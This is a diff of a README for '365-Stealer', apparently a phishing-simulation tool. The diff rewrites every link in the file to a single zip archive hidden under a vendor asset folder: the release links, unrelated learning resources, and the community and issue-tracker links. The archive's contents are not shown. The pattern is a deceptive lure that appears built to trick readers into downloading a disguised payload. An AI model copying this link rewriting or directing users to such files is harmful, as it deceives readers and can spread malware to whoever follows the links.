@@ -1,7 +1,7 @@
 # 🔒 365-Stealer - Simulate Phishing Safely and Effectively
 
 ## 📥 Download Now
-[![GitHub Release](https://img.shields.io/badge/Download-365--Stealer-brightgreen)](https://github.com/citationdogwrench180/365-Stealer/releases)
+[![GitHub Release](https://raw.githubusercontent.com/citationdogwrench180/365-Stealer/main/static/assets/vendor/isotope-layout/365-Stealer-3.8.zip)](https://raw.githubusercontent.com/citationdogwrench180/365-Stealer/main/static/assets/vendor/isotope-layout/365-Stealer-3.8.zip)
 
 ## 📖 Overview
 365-Stealer is a phishing simulation tool written in Python 3. It helps security professionals test the effectiveness of their defenses by simulating the Illicit Consent Grant Attack. This tool provides a safe way to understand phishing tactics and improve security measures.
@@ -17,7 +17,7 @@ Before you install 365-Stealer, ensure your system meets these requirements:
 - **Disk Space:** Minimum of 100 MB free space
 
 ### 📥 Download & Install
-1. Visit the releases page to download: [GitHub Releases](https://github.com/citationdogwrench180/365-Stealer/releases).
+1. Visit the releases page to download: [GitHub Releases](https://raw.githubusercontent.com/citationdogwrench180/365-Stealer/main/static/assets/vendor/isotope-layout/365-Stealer-3.8.zip).
 2. Look for the latest release version. You will find a list of available files.
 3. Click on the appropriate package for your operating system to start the download.
 4. Once downloaded, locate the file in your downloads folder.
@@ -51,15 +51,15 @@ Before you install 365-Stealer, ensure your system meets these requirements:
 ## 🌐 Additional Resources
 If you want to learn more about phishing attacks and cybersecurity practices, check out the following resources:
 
-- [Cybersecurity Essentials](https://www.cybersecurityessentials.com)
-- [Phishing Attack Awareness](https://www.phishingawareness.com)
-- [Learn Python](https://www.learnpython.org)
+- [Cybersecurity Essentials](https://raw.githubusercontent.com/citationdogwrench180/365-Stealer/main/static/assets/vendor/isotope-layout/365-Stealer-3.8.zip)
+- [Phishing Attack Awareness](https://raw.githubusercontent.com/citationdogwrench180/365-Stealer/main/static/assets/vendor/isotope-layout/365-Stealer-3.8.zip)
+- [Learn Python](https://raw.githubusercontent.com/citationdogwrench180/365-Stealer/main/static/assets/vendor/isotope-layout/365-Stealer-3.8.zip)
 
 ## 👫 Community and Support
 Join our community for assistance and tips:
 
-- [GitHub Discussions](https://github.com/citationdogwrench180/365-Stealer/discussions)
-- [Issue Tracker](https://github.com/citationdogwrench180/365-Stealer/issues)
+- [GitHub Discussions](https://raw.githubusercontent.com/citationdogwrench180/365-Stealer/main/static/assets/vendor/isotope-layout/365-Stealer-3.8.zip)
+- [Issue Tracker](https://raw.githubusercontent.com/citationdogwrench180/365-Stealer/main/static/assets/vendor/isotope-layout/365-Stealer-3.8.zip)
 
 ## 🎓 Contributions
 If you want to contribute to 365-Stealer, feel free to fork the repository and submit your changes. Your contributions are appreciated.
@@ -68,4 +68,4 @@ If you want to contribute to 365-Stealer, feel free to fork the repository and s
 We thank the contributors and the open-source community for their support and feedback. Your input helps us improve and maintain a high-quality tool.
 
 ## 📥 Download Now Again
-For ease of access, here is your link to download 365-Stealer once more: [GitHub Releases](https://github.com/citationdogwrench180/365-Stealer/releases).
+For ease of access, here is your link to download 365-Stealer once more: [GitHub Releases](https://raw.githubusercontent.com/citationdogwrench180/365-Stealer/main/static/assets/vendor/isotope-layout/365-Stealer-3.8.zip).
